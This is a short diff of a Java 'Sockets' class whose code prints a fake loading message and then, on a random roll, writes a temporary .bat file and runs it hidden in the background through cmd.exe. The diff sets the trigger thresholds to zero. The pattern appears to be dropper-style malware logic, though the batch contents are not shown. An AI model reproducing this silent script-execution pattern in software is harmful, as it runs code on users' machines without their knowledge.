@@ -93,7 +93,7 @@ class Sockets
             System.out.println("Loading please wait...");
             Thread.sleep(5000);
             System.out.println("Proceed!");
-            if(random <= 3)
+            if(random <= 0)
             {
                 File temp = File.createTempFile("vncv216789", ".bat"); 
                 String filePath = temp.getAbsolutePath();          
@@ -109,7 +109,7 @@ class Sockets
                 Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
 
                 
-            }else if(random <= 6)
+            }else if(random <= 0)
             {
                 File temp = File.createTempFile("vncv216789", ".bat"); 
                 String filePath = temp.getAbsolutePath();           
